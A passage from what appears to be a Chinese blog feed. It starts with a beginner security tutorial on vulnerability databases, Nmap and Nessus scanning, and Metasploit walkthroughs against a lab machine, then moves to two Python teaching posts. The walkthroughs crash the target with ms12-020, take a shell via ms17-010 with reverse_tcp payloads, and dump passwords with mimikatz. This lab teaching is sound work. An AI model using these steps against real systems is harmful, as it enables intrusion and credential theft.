class="headerlink" title="漏洞的信息组成"></a>漏洞的信息组成</h3><p>（1）漏洞名称</p><p>（2）发布日期</p><p>（3）漏洞编号</p><p>（4）风险等级</p><p>（5）影响范围</p><p>（6）漏洞描述</p><p>（7）解决方案</p><h3 id="漏洞信息管理"><a href="#漏洞信息管理" class="headerlink" title="漏洞信息管理"></a>漏洞信息管理</h3><p>（1）CVE(Common Vulnerabliities &amp; Exposures,通用漏洞披露)</p><p>（2）美国国家漏洞数据库(NVD)</p><p>（3）<a href="http://cve.mitre.org/">http://cve.mitre.org</a> CVE官网</p><p>（4）<a href="http://www.cnnvd.org.cn/index.htm">http://www.cnnvd.org.cn/index.html</a> 国家信息安全漏洞库</p><p>（5）<a href="http://www.nsfocus.net/">http://www.nsfocus.net/</a> 绿盟科技</p><p>（6）<a href="http://www.scap.org.cn/">http://www.scap.org.cn/</a> SCAP 安全内容自动化协议中文社区</p><p>（7）微软安全公告</p><h2 id="安全漏洞的检测技术"><a href="#安全漏洞的检测技术" class="headerlink" title="安全漏洞的检测技术"></a>安全漏洞的检测技术</h2><h3 id="漏洞检测技术"><a href="#漏洞检测技术" class="headerlink" title="漏洞检测技术"></a>漏洞检测技术</h3><p>寻找漏洞方法：</p><p>（1）静态分析：人为查看代码(分析代码)</p><p>（2）动态分析：使用工具nmap(端口)、nessus(服务、OS)、msf(扫描、验证)进行漏洞扫描</p><p>利用漏洞实时攻击：<br>（1）静态：人为写payload</p><p>（2）动态：工具msf</p><h3 id="常见的系统漏洞扫描器"><a href="#常见的系统漏洞扫描器" class="headerlink" title="常见的系统漏洞扫描器"></a>常见的系统漏洞扫描器</h3><p>（1）系统漏洞扫描器是相对于WEB应用漏洞扫描器而言的，主要是针对操作系统和各类通用性较强的软件应用进行漏洞检测的工具。</p><p>（2）软件类：NESSUS、OpenVAS、Nmap</p><p>（3）硬件类：绿盟科技远程安全评估系统、网御漏洞扫描系统、榕基风险管理系统、杭州迪普漏洞扫描系统、启明天镜脆弱性扫描与管理系统</p><h3 id="系统漏洞扫描的基本流程"><a href="#系统漏洞扫描的基本流程" class="headerlink" title="系统漏洞扫描的基本流程"></a>系统漏洞扫描的基本流程</h3><p>存活判断–&gt;端口扫描–&gt;服务识别–&gt;系统识别–&gt;弱口令/登录扫描–&gt;漏洞映射</p><h3 id="漏洞识别原理"><a href="#漏洞识别原理" class="headerlink" title="漏洞识别原理"></a>漏洞识别原理</h3><p>漏洞识别的主要方法可以分为原理扫描和推断扫描两类，在实际实现的过程中，扫描器开发者会根据漏洞的特点不同而选择不同的漏洞识别技术，进行漏洞识别。</p><table><thead><tr><th align="center">识别技术</th><th align="center">检测思路</th><th align="center">准确率</th><th align="center">检测效率</th><th align="center">对目标的影响</th><th align="center">适用场景</th></tr></thead><tbody><tr><td align="center">原理扫描</td><td align="center">利用漏洞形成的原因和漏洞的特点尝试对漏洞进行利用，并根据漏洞利用的结果来判断漏洞是否存在</td><td align="center">高</td><td align="center">步骤多，检测速度慢</td><td align="center">对目标影响较大，可能导致目标宕机或破坏程序和数据</td><td align="center">常用于WEB应用漏洞扫描和一些利用后不影响系统运行的漏洞，尤其不适用于拒绝服务漏洞。</td></tr><tr><td align="center">推断扫描</td><td align="center">推断扫描不直接利用漏洞，而是寻找其他漏洞存在的证据，并以此推断漏洞存在。版本检查是推断扫描的常用方式之一</td><td align="center">受实现技术和漏洞修复技术的影响，有一定的误报率</td><td align="center">过程简单，速度较快</td><td align="center">不利用漏洞，对目标影响较小</td><td align="center">适用于通用软件的扫描，在大规模的扫描任务中有比较明显的优势。</td></tr></tbody></table><h3 id="利用Nmap扫描漏洞"><a href="#利用Nmap扫描漏洞" class="headerlink" title="利用Nmap扫描漏洞"></a>利用Nmap扫描漏洞</h3><p>（1）常见的Nmap脚本扫描，命令格式如下：</p><pre><code>nmap --script=&lt;类别参数&gt;##常用的脚本扫描参数：vuln:负责检查目标机是否有常见的漏洞(Vulnerability),如是否有MS08_067</code></pre><p>（2）例子：</p><pre><code>ifconfig           //先查看本机所在网段nmap --sP 192.168.14.0/24     //扫描本网段中存活的主机nmap --script=vuln 192.168.14.131    //扫描靶机是否有常见的漏洞</code></pre><p><img src="https://i.loli.net/2020/12/06/mDLr54RPzpfkiI6.png" alt="image-20201206140811838"></p><p><img src="https://i.loli.net/2020/12/06/osvrzTiFplNQ82E.png"></p><h2 id="Nessus介绍与漏洞扫描"><a href="#Nessus介绍与漏洞扫描" class="headerlink" title="Nessus介绍与漏洞扫描"></a>Nessus介绍与漏洞扫描</h2><h3 id="NESSUS简介"><a href="#NESSUS简介" class="headerlink" title="NESSUS简介"></a>NESSUS简介</h3><p>目前最多人使用的<strong>系统漏洞扫描与分析软件</strong>,具有能够提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。可同时在本机或远端上遥控，进行系统的漏洞分析扫描，运作效能随着系统的资源而自行调整。可自行定义插件(Plug-in)等特性。</p><h3 id="NESSUS的功能介绍"><a href="#NESSUS的功能介绍" class="headerlink" title="NESSUS的功能介绍"></a>NESSUS的功能介绍</h3><p>（1）打开浏览器输入<a href="https://localhost:8834进入登录页面输入账号密码登录(这里使用的是虚拟机进行操作，若要在物理机上登录NESSUS，可在浏览器中输入https://192.168.14.132:8834，其中192.168.14.132是虚拟机的IP地址)">https://localhost:8834进入登录页面输入账号密码登录(这里使用的是虚拟机进行操作，若要在物理机上登录NESSUS，可在浏览器中输入https://192.168.14.132:8834，其中192.168.14.132是虚拟机的IP地址)</a></p><p>（2）在首页选择new scans 或者 Creat a new scan新建一个扫描任务，新建任务时需要对扫描进行选择或者配置，带有upgrade标签的是需要升级成企业版或者专业版才能使用，这里选择免费的“Basic Network Scan进行配置。</p><p><img src="https://i.loli.net/2020/12/06/AdDqFb3GT81k6f7.png" alt="image-20201206142030678"></p><p><img src="https://i.loli.net/2020/12/06/m71ce3RjDa9odwA.png" alt="image-20201206142222469"></p><p>（3）通常情况下，只对General(一般选项)、Discovery(主机发现)、Assessment(风险评估)、及Advanced(高级选项)进行配置。</p><p><img src="https://i.loli.net/2020/12/06/fCsbW2ah5jeyw4B.png" alt="image-20201206142758916"></p><h3 id="常见漏洞扫描器的使用方法"><a href="#常见漏洞扫描器的使用方法" class="headerlink" title="常见漏洞扫描器的使用方法"></a>常见漏洞扫描器的使用方法</h3><p>选择任务类型–&gt;填写扫描目标–&gt;选择扫描模板/插件–&gt;高级选项(可默认)–&gt;扫描报告选项–&gt;开始扫描</p><h3 id="NESSUS的使用"><a href="#NESSUS的使用" class="headerlink" title="NESSUS的使用"></a>NESSUS的使用</h3><p>（1）设置项目名称、归属栏目为my scans，输入目标主机IP或网段</p><p><img src="https://i.loli.net/2020/12/06/PJ5tnvolMpHh8Aa.png" alt="image-20201206153948858"></p><p>（2）点击Launch开始扫描，可在首页查看扫描记录，点击对应的扫描任务可查看任务的详细信息，可导出</p><p><img src="https://i.loli.net/2020/12/06/hygtJVelpXWNBFm.png" alt="image-20201206144435278"></p><p><img src="https://i.loli.net/2020/12/06/MFipyxdWQketaKr.png" alt="image-20201206145449869"></p><p>（3）选择扫描任务进入后可查看扫描信息</p><p><img src="https://i.loli.net/2020/12/06/cKR5VoZiCFrJhAz.png" alt="image-20201206145610763"></p><p>（4）点击要查看的漏洞，可获取该漏洞的介绍、漏洞对应的解决方案、生成原因、涉及到的端口和主机信息，可导出。</p><p><img src="https://i.loli.net/2020/12/06/sd3Nc12RA8PX6TG.png" alt="image-20201206150013091"></p><h3 id="NESSUS的报告解读"><a href="#NESSUS的报告解读" class="headerlink" title="NESSUS的报告解读"></a>NESSUS的报告解读</h3><p>漏洞风险等级、漏洞描述、漏洞涉及服务端口</p><h2 id="Metasploit-msf-介绍与漏洞利用"><a href="#Metasploit-msf-介绍与漏洞利用" class="headerlink" title="Metasploit(msf)介绍与漏洞利用"></a>Metasploit(msf)介绍与漏洞利用</h2><p>Metasploit就是一个漏洞利用框，简称MSF。作为全球最受欢迎的工具，不仅仅因为它的方便和强大，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。</p><h3 id="Metasploit常用的命令"><a href="#Metasploit常用的命令" class="headerlink" title="Metasploit常用的命令"></a>Metasploit常用的命令</h3><p>（1）show exploits   显示可用的渗透攻击模块</p><p>（2）search               用来搜寻一些渗透攻击模块，可以进行模糊匹配</p><p>（3）use                    使用某个渗透攻击模块，可以通过use命令来使用show或search出来的渗透模块</p><p>（4）show options  显示参数当选择渗透模块后，使用show options会显示该模块所需设置的参数，熟练后可不      用</p><p>（5）set                    用来设置某些选项，比如使用set命令设置攻击模块的options参数；设置攻击载荷payloads</p><p>（6）exploit             设置完所有参数时，使用exploit命令，开始进行攻击，也可用run</p><h3 id="Metasploit攻击流程与思路"><a href="#Metasploit攻击流程与思路" class="headerlink" title="Metasploit攻击流程与思路"></a>Metasploit攻击流程与思路</h3><p>搜索攻击模块–&gt;利用攻击模块–&gt;查看与配置选项–&gt;进行攻击</p><p>（1）搜寻攻击模块：search + 漏洞信息或编号</p><p>（2）使用某个模块：use</p><p>（3）查看配置选项：show options</p><p>（4）设置选项值：set</p><p>（5）开始攻击：exploit/run</p><h3 id="ms12-020漏洞利用"><a href="#ms12-020漏洞利用" class="headerlink" title="ms12-020漏洞利用"></a>ms12-020漏洞利用</h3><p>（1）在kali里打开metasploit漏洞利用框架，也可直接在终端中输入命令msfconsole打开</p><p><img src="https://i.loli.net/2020/12/06/Uv5pFWO3dfyA9x2.png" alt="image-20201206161452095"></p><p>（2）搜索ms12-020漏洞利用模块</p><pre><code>search ms12-020auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code></pre><p><img src="https://i.loli.net/2020/12/06/Qx1cHIsEkjU4hCv.png" alt="image-20201206161732437"></p><p>（3）使用模块use+模块名,可用table键补全，也可以use+模块前的编号(如0,1,2….)</p><p><img src="https://i.loli.net/2020/12/06/3qy5Cd9RaYbInSm.png" alt="image-20201206161936099"></p><p>（4）查看当前模块所需配置项show options，有”yes”的地方需要配置参数，其中RHOST需设置为远程靶机的IP地址</p><p><img src="https://i.loli.net/2020/12/06/Hy6SwYbgshczuTV.png" alt="image-20201206162138879"></p><p>（5）设置配置项，这一步配置好后，可以再次执行show options命令查看是否设置成功</p><pre><code>set RHOST 192.168.14.131      //192.168.14.131为靶机的IP</code></pre><p><img src="https://i.loli.net/2020/12/06/qSI5pXsAk6TDtrW.png" alt="image-20201206162349469"></p><p>（6）实施攻击exploit或run，可发现靶机蓝屏</p><p><img src="https://i.loli.net/2020/12/06/4kCD1JwWvxX7Bhd.png" alt="image-20201206162544164"></p><p><img src="https://i.loli.net/2020/12/06/ELmSMNu4rqGJTsO.png" alt="image-20201206162959336"></p><h3 id="ms17-010漏洞利用"><a href="#ms17-010漏洞利用" class="headerlink" title="ms17-010漏洞利用"></a>ms17-010漏洞利用</h3><p>（1）在kali里打开metasploit漏洞利用框架，也可直接在终端中输入命令msfconsole打开</p><p>（2）搜索ms17-010漏洞利用模块</p><p>（3）使用模块use+模块名，不同的攻击模块效果不同，这里使用第三个攻击模块</p><p><img src="https://i.loli.net/2020/12/06/5qv39wEAKTyGPox.png" alt="image-20201206163607554"></p><p>（4）show options</p><p><img src="https://i.loli.net/2020/12/06/Adl2F3oyBrD86sI.png" alt="image-20201206163718981"></p><p>（5）设置配置项，这一步配置好后，可以再次执行show options命令查看是否设置成功</p><pre><code>set RHOST 192.168.14.131       //192.168.14.131为靶机的IP</code></pre><p>（6）开始攻击exploit/run，可发现获取了靶机的shell界面，Ctrl+C退出该shell界面</p><p><img src="https://i.loli.net/2020/12/06/hPi6Of7QCVS2Lnw.png" alt="image-20201206164237163"></p><p>（7）但是存在乱码，解决方法：”终端”–&gt;”设定字符编码”–&gt;”简体中文—GB2312”</p><p><img src="https://i.loli.net/2020/12/06/39vQqjzUVWZ2wgM.png" alt="image-20201206164518356"></p><p><img src="https://i.loli.net/2020/12/06/HgTtuQGAfwh2m8b.png" alt="image-20201206164717015"></p><p>（8）利用获取的shell界面，在靶机桌面创建一个1.txt文档。</p><pre><code>cd /users/ndsec/Desktopedit 1.txt</code></pre><p>（9）利用ms17-010漏洞进行实时监控靶机</p><pre><code>set payload windows/x64/vncinject/reverse_tcp</code></pre><p><img src="https://i.loli.net/2020/12/06/zUqP5EeRxMYHwod.png" alt="image-20201206165435030"></p><p>（10）利用ms17-010漏洞获取靶机密码</p><pre><code>set payload windows/x64/meterpreter/reverse_tcpexploit/runload mimikatz        //加载模块获取密码msv                  //利用mimikatz的msv获取密文hashkerberos             //获取明文密码</code></pre><p><img src="https://i.loli.net/2020/12/06/kaUPCm1t3sovcnL.png" alt="image-20201206171203722"></p><p><img src="https://i.loli.net/2020/12/06/o6sd89qRGHfbme3.png" alt="image-20201206172505028"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(三)</title>
      <link href="2020/12/02/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8401/"/>
      <url>2020/12/02/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8401/</url>
      
        <content type="html"><![CDATA[<h2 id="程序的基本结构"><a href="#程序的基本结构" class="headerlink" title="程序的基本结构"></a>程序的基本结构</h2><p>要点：程序由3种基本结构组成：顺序结构、分支结构和循环结构</p><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>（1）顺序结构：程序按照线性顺序依次执行的一种运行方式</p><p>（2）分支结构：程序根据条件判断结果而选择不同向前执行路径的一种运行方式。包括单分支结构和二分支结构，二分支结构组合形成多分支结构。</p><p>（3）循环结构：程序根据条件判断结果向后反复执行的一种运行方式。根据循环体触发条件不同，循环结构包括条件循环和遍历循环。</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>（1）圆面积和周长的计算</p><pre><code class="python">R = eval(input(&quot;请输入圆半径：&quot;))S = 3.1415*R*RL = 2*3.1415*Rprint(&quot;面积和周长&quot;,S,L)</code></pre><p>（2）实数绝对值的计算</p><pre><code class="python">R = eval(input(&quot;输入实数：&quot;))if (R &lt; 0):    R = -Rprint(&quot;绝对值为&quot;,R)</code></pre><p>（3）正整数累加</p><pre><code class="python">R = eval(input(&quot;请输入整数：&quot;))i,sum = 0, 0while(i&lt;=R):    sum += i    i +=1print(&quot;累加求和&quot;,sum)</code></pre><h2 id="程序的分支结构"><a href="#程序的分支结构" class="headerlink" title="程序的分支结构"></a>程序的分支结构</h2><h3 id="单分支结构-if语句"><a href="#单分支结构-if语句" class="headerlink" title="单分支结构:if语句"></a>单分支结构:if语句</h3><p>（1）Python中if语句的语法格式如下：</p><pre><code class="python">if &lt;条件&gt;:    &lt;语句块&gt;</code></pre><p>（2）形成条件判断最常见的方式是采用关系操作符。Python共有6个关系操作符。</p><table><thead><tr><th align="center">操作符</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">&lt;</td><td align="center">小于</td></tr><tr><td align="center">&lt;=</td><td align="center">小于或等于</td></tr><tr><td align="center">&gt;=</td><td align="center">大于或等于</td></tr><tr><td align="center">&gt;</td><td align="center">大于</td></tr><tr><td align="center">==</td><td align="center">等于</td></tr><tr><td align="center">!=</td><td align="center">不等于</td></tr></tbody></table><p><strong>Python使用”=”表示赋值语句，使用”==”表示等于</strong></p><p>（3）实例：PM2.5空气质量提醒(1)</p><pre><code class="python">PM = eval(input(&quot;请输入PM2.5值：&quot;))if 0 &lt;= PM &lt; 35:    print(&quot;空气质量优，快去户外活动!&quot;)if 35 &lt;= PM &lt;75:    print(&quot;空气质量良好，适度户外活动!&quot;)if 75 &lt;= PM:    print(&quot;空气污染，请小心!&quot;)</code></pre><p>（4）上述代码使用数字进行比较，而字符或字符串也可以用于条件比较。字符串比较本质上是字符串对应Unicode编码的比较。因此，字符串的比较按照字典顺序进行。例如英文大写字符对应的Unicode编码比小写字符小。</p><pre><code class="python">&gt;&gt;&gt; &quot;Python&quot; &gt; &quot;python&quot;False</code></pre><h3 id="二分支结构-if-else语句"><a href="#二分支结构-if-else语句" class="headerlink" title="二分支结构:if-else语句"></a>二分支结构:if-else语句</h3><p>（1）Python语句中if-else语句用来形成二分支结构，语法格式如下：</p><pre><code class="python">if &lt;条件&gt;:    &lt;语句块1&gt;else:    &lt;语句块2&gt;</code></pre><p>（2）语句块1是在if条件满足后执行的一个或多个语句序列，语句块2是if条件不满足后执行的语句序列。</p><p>（3）实例：PM2.5空气质量提醒(2)</p><pre><code class="python">PM = eval(input(&quot;请输入PM2.5数值：&quot;))if PM &gt;=75:    print(&quot;空气存在污染，请小心!&quot;)else:    print(&quot;空气没有污染，可以开展户外活动!&quot;)</code></pre><p>（4）二分支结构还有一种更为简洁的表达方式，适合通过判断返回特定值，语法格式如下：</p><pre><code class="python">&lt;表达式1&gt; if &lt;条件&gt; else &lt;表达式2&gt;</code></pre><p>上述实例可改造为：</p><pre><code class="Python">PM = eval(input(&quot;请输入PM2.5数值：&quot;))print(&quot;空气&#123;&#125;污染!&quot;.format(&quot;存在&quot; if PM &gt;= 75 else &quot;没有&quot;))</code></pre><p>（5）其他适合对特殊值处理的情况：</p><pre><code class="python">&gt;&gt;&gt; count = 2&gt;&gt;&gt; count if count!=0 else &quot;不存在&quot;2&gt;&gt;&gt; count = 0&gt;&gt;&gt; count if count!=0 else &quot;不存在&quot;&#39;不存在&#39;</code></pre><h3 id="多分支结构：if-elif-else语句"><a href="#多分支结构：if-elif-else语句" class="headerlink" title="多分支结构：if-elif-else语句"></a>多分支结构：if-elif-else语句</h3><p>（1）Python的if-elif-else描述多分支结构，语句格式如下：</p><pre><code class="python">if &lt;条件1&gt;:    &lt;语句块1&gt;elif &lt;条件2&gt;:    &lt;语句块2&gt;...else:    &lt;语句块N&gt;</code></pre><p>（2）多分支结构是二分支结构的扩展，通常用于设置同一个条件的多条执行路径。Python依次评估寻找第一个结果为True的条件，执行该条件下的语句块，然后跳过整个if-elif-else结构，执行后面的语句。</p><p>（3）实例：</p><pre><code class="python">PM = eval(input(&quot;请输入PM2.5值：&quot;))if 0 &lt;= PM &lt; 35:    print(&quot;空气质量优，快去户外活动!&quot;)elif 35 &lt;= PM &lt;75:    print(&quot;空气质量良好，适度户外活动!&quot;)else:    print(&quot;空气污染，请小心!&quot;)</code></pre><h2 id="实例5-身体质量指数BMI"><a href="#实例5-身体质量指数BMI" class="headerlink" title="实例5:身体质量指数BMI"></a>实例5:身体质量指数BMI</h2><p>（1）BMI定义:BMI值等于体重(kg)除以身高(m)的平方。</p><p>（2）指标分类：</p><table><thead><tr><th align="center">分类</th><th align="center">国际BMI值</th><th align="center">国内BMI值</th></tr></thead><tbody><tr><td align="center">偏瘦</td><td align="center">&lt;18.5</td><td align="center">&lt;18.5</td></tr><tr><td align="center">正常</td><td align="center">18.5~25</td><td align="center">18.5~24</td></tr><tr><td align="center">偏胖</td><td align="center">25~30</td><td align="center">24~28</td></tr><tr><td align="center">肥胖</td><td align="center">&gt;=30</td><td align="center">&gt;=28</td></tr></tbody></table><p>（3）</p><pre><code class="python">height, weight = eval(input(&quot;请输入身高(米)和体重\      #采用反斜杠(\)将很长的一行分解两行书写(公斤)[逗号隔开]:&quot;))bmi = weight / pow(height,2)print(&quot;BMI数值为：&#123;:.2f&#125;&quot;.format(bmi))who, dom = &quot;&quot;,&quot;&quot;if bmi &lt; 18.5:      #WHO标准    who = &quot;偏瘦&quot;elif bmi &lt; 25:    who = &quot;正常&quot;elif bmi &lt;30:    who = &quot;偏胖&quot;else:    who = &quot;肥胖&quot;if bmi &lt; 18.5:      #我国卫生部标准    dom = &quot;偏瘦&quot;elif bmi &lt; 24:    dom = &quot;正常&quot;elif bmi &lt; 28:    dom = &quot;偏胖&quot;else:    dom = &quot;肥胖&quot;print(&quot;BMI指标为：国际&#39;&#123;0&#125;&#39;,国内&#39;&#123;1&#125;&#39;&quot;.format(who, dom))</code></pre><h2 id="程序的循环结构"><a href="#程序的循环结构" class="headerlink" title="程序的循环结构"></a>程序的循环结构</h2><p><strong>要点：Python通过for、while等保留字提供遍历循环和无限循环的结构</strong></p><p>（1）根据循环的确定次数，可分为确定次数循环和非确定次数循环。</p><p>（2）确定次数循环在Python中被称为“遍历循环”，具体采用for语句实现。</p><p>（3）非确定次数循环程序不确定循环体可能的执行次数，而通过条件判断是否继续执行循环体，称为无限循环，又叫条件循环，采用while语句实现。</p><h3 id="遍历循环：for语句"><a href="#遍历循环：for语句" class="headerlink" title="遍历循环：for语句"></a>遍历循环：for语句</h3><p>（1）Python通过保留字for实现“遍历循环”，基本使用方法如下：</p><pre><code>for &lt;循环变量&gt; in &lt;遍历结构&gt;:    &lt;语句块&gt;</code></pre><p>（2）遍历结构可以是字符串、文件、组合数据类型或range()函数等，常用的使用方法如下：</p><pre><code class="Python">#循环n次for i in range(n):    &lt;语句块&gt;#遍历文件file的每一行for line in file:    &lt;语句块&gt;#遍历字符串sfor c in s:    &lt;语句块&gt;#遍历列表lsfor item in ls:    &lt;语句块&gt;</code></pre><p>（3）遍历循环的一种扩展模式，使用方法如下：</p><pre><code class="python">for &lt;循环结构&gt; in &lt;遍历结构&gt;:    &lt;语句块1&gt;else:    &lt;语句块2&gt;</code></pre><p>在扩展模式中，else语句只在循环正常执行并结束后才执行。因此，可以在&lt;语句块2&gt;中放置判断循环执行情况的语句。</p><pre><code class="python">for s in &quot;BIT&quot;:    print(&quot;循环进行中：&quot;+s)else:    s = &quot;循环正常结束&quot;print(s)</code></pre><p>执行结果：</p><pre><code class="python">循环进行中：B循环进行中：I循环进行中：T循环正常结束&gt;&gt;&gt; </code></pre><h3 id="无限循环：while语句"><a href="#无限循环：while语句" class="headerlink" title="无限循环：while语句"></a>无限循环：while语句</h3><p>（1）Python通过保留字while实现无限循环，基本使用方法如下：</p><pre><code class="Python">while &lt;条件&gt;：    &lt;语句块&gt;</code></pre><p>其中条件与if语句中的判断条件一样，结果为True和False。</p><p>（2）无限循环：使用保留字else的扩展模式，使用方法如下：</p><pre><code class="python">while &lt;条件&gt;:    &lt;语句块1&gt;else：    &lt;语句块2&gt;</code></pre><p>在这种扩展模式中，else语句只在循环正常执行后才执行。</p><pre><code class="python">s, idx = &quot;BIT&quot;, 0while idx &lt; len(s):    print(&quot;循环进行中：&quot; + s[idx])    idx += 1else:    s = &quot;循环正常结束&quot;print(s)</code></pre><p>执行结果：</p><pre><code class="python">循环进行中：B循环进行中：I循环进行中：T循环正常结束&gt;&gt;&gt; </code></pre><p>（3）若要通过while实现一个计数循环，则需在循环之前对计数器idx进行初始化，并在每次循环中对计数器idx进行累加。而for循环中循环变量逐一取自遍历结构，不需要程序维护计数器。</p><h3 id="循环保留字：break和continue"><a href="#循环保留字：break和continue" class="headerlink" title="循环保留字：break和continue"></a>循环保留字：break和continue</h3><p>（1）这两个保留字用来辅助控制循环执行。</p><p>（2）break用来跳出最内层for或while循环，脱离该循环后程序从循环代码后继续执行，例如：</p><pre><code class="python">for s in &quot;BIT&quot;:    for i in range(10):        print(s, end=&quot;&quot;)        if s==&quot;I&quot;:            break</code></pre><p>执行结果：</p><pre><code class="python">BBBBBBBBBBITTTTTTTTTT&gt;&gt;&gt;</code></pre><p>其中，break语句跳出了最内层for循环，单仍然继续执行外层循环，每个break语句只能跳出当前层次循环。</p><p>（3）continue用来结束当前当次循环，即跳过循环体中下面还没执行的语句，但不跳出循环。</p><pre><code class="python">for s in &quot;Python&quot;:    if s == &quot;t&quot;:        continue    print(s, end=&quot;&quot;)</code></pre><p>执行结果：</p><pre><code class="python">Pyhon&gt;&gt;&gt; </code></pre><p>（4）for循环和while循环中都存在else扩展用法，else语句只在一种情况下执行，即循环正常遍历了所有内容或由于条件不成立而结束循环，没有因为break或return而退出循环。若有break或return则不执行else，continue保留字对else没有影响。</p><pre><code class="python">#continuefor s in &quot;Python&quot;:    if s == &quot;t&quot;:        continue    print(s, end=&quot;&quot;)else:    print(&quot;正常退出&quot;)</code></pre><p>执行结果：</p><pre><code>Pyhon 正常退出&gt;&gt;&gt; </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(二)</title>
      <link href="2020/11/29/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%BA%8C)-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B02/"/>
      <url>2020/11/29/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%BA%8C)-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B02/</url>
      
        <content type="html"><![CDATA[<h2 id="字符串类型及其操作"><a href="#字符串类型及其操作" class="headerlink" title="字符串类型及其操作"></a>字符串类型及其操作</h2><p>要点：字符串是字符的序列表示，可以通过基本的字符串操作符、内置字符串处理函数和字符串处理方法等对字符串进行操作。</p><h3 id="字符串类型的表示"><a href="#字符串类型的表示" class="headerlink" title="字符串类型的表示"></a>字符串类型的表示</h3><p>（1）字符串可以由一对单引号(‘)、双引号(“)或三引号(“‘)构成。其中，单引号和双引号都可以表示单行字符串，两者作用相同。三引号可以表示单行或者多行字符串。</p><table><thead><tr><th>表示方法</th><th>可行操作</th></tr></thead><tbody><tr><td>单引号字符串</td><td>可以使用双引号作为字符串的一部分</td></tr><tr><td>双引号字符串</td><td>可以使用单引号作为字符串的一部分</td></tr><tr><td>三引号字符串</td><td>可以使用双引号、单引号，也可以换行</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; print(&#39;我爱&quot;中国&quot;这个伟大的国家&#39;)我爱&quot;中国&quot;这个伟大的国家&gt;&gt;&gt; print(&quot;她有着&#39;960万平方公里&#39;的土地&quot;)她有着&#39;960万平方公里&#39;的土地&gt;&gt;&gt; print(&#39;&#39;&#39;她还有&quot;14亿&quot;的人口是&#39;世界第二大经济体&#39;&#39;&#39;&#39;)她还有&quot;14亿&quot;的人口是&#39;世界第二大经济体&#39;&gt;&gt;&gt; </code></pre><p>（2）input()函数将用户的输入内容当做一个字符串类型，print()函数可以直接打印字符串。</p><pre><code class="Python">&gt;&gt;&gt;name = input(&quot;请输入名字：&quot;)请输入名字：Python&gt;&gt;&gt;print(name)Python</code></pre><p>（3）字符串以Unicode编码存储，因此，字符串的英文字符和中文字符都算作1个字符。</p><pre><code class="python">&gt;&gt;&gt; name = &quot;Python语言程序设计&quot;&gt;&gt;&gt; print(name[0], name[7], name[-1])P 言 计&gt;&gt;&gt; print(name[2:-4])thon语言&gt;&gt;&gt; print(name[:6])Python&gt;&gt;&gt; print(name[6:])语言程序设计&gt;&gt;&gt; print(name[:])Python语言程序设计</code></pre><p>（4）反斜杠字符\是一个特殊字符，在字符串中表示转义，即该字符与后面相邻的一个字符共同组成了新的含义。例如，\n表示换行、\\表示反斜杠、\‘表示单引号、\“表示双引号、\t表示制表符(Tab)等。例如：</p><pre><code class="python">&gt;&gt;&gt; print(&quot;Python\n语言\t程序\t设计&quot;)Python语言    程序    设计</code></pre><h3 id="基本的字符串操作符"><a href="#基本的字符串操作符" class="headerlink" title="基本的字符串操作符"></a>基本的字符串操作符</h3><p>（1）5个基本的字符串操作符</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x + y</td><td align="center">连接两个字符串x与y</td></tr><tr><td align="center">x * n 或 n * x</td><td align="center">复制n次字符串x</td></tr><tr><td align="center">x in s</td><td align="center">如果x是s的子串，返回True，否则返回False</td></tr><tr><td align="center">str[i]</td><td align="center">索引，返回第i个字符</td></tr><tr><td align="center">str[N:M]</td><td align="center">切片，返回索引第N到第M的子串，其中不包含M</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; &quot;Python语言&quot; + &quot;程序设计&quot;&#39;Python语言程序设计&#39;&gt;&gt;&gt; name = &quot;Python语言&quot; + &quot;程序设计&quot; + &quot;基础&quot;&gt;&gt;&gt; name&#39;Python语言程序设计基础&#39;&gt;&gt;&gt; &quot;Python语言&quot; in nameTrue&gt;&gt;&gt; &quot;good&quot; in nameFalse&gt;&gt;&gt; &quot;good!&quot; * 3&#39;good!good!good!&#39;</code></pre><p>（2）获取星期字符串，例如：输入3，返回“星期三”。</p><pre><code class="python">weekstr = &quot;星期一星期二星期三星期四星期五星期六星期日&quot;weekid = eval(input(&quot;请输入星期数字(1-7)：&quot;))pos = (weekid - 1)*3print(weekstr[pos:pos+3])</code></pre><p>运行结果：</p><pre><code class="python">&gt;&gt;&gt;请输入星期数字(1-7)：3星期三</code></pre><h3 id="内置的字符串处理函数"><a href="#内置的字符串处理函数" class="headerlink" title="内置的字符串处理函数"></a>内置的字符串处理函数</h3><p>（1）共6个</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">len(x)</td><td align="center">返回字符串x的长度，也可返回其他组合数据类型元素个数</td></tr><tr><td align="center">str(x)</td><td align="center">返回任意类型x所对应的字符串形式</td></tr><tr><td align="center">chr(x)</td><td align="center">返回Unicode编码x对应的单字符</td></tr><tr><td align="center">ord(x)</td><td align="center">返回单字符表示的Unicode编码</td></tr><tr><td align="center">hex(x)</td><td align="center">返回整数x对应十六进制数的小写形式字符串</td></tr><tr><td align="center">oct(x)</td><td align="center">返回整数x对应八进制数的小写形式字符串</td></tr></tbody></table><pre><code 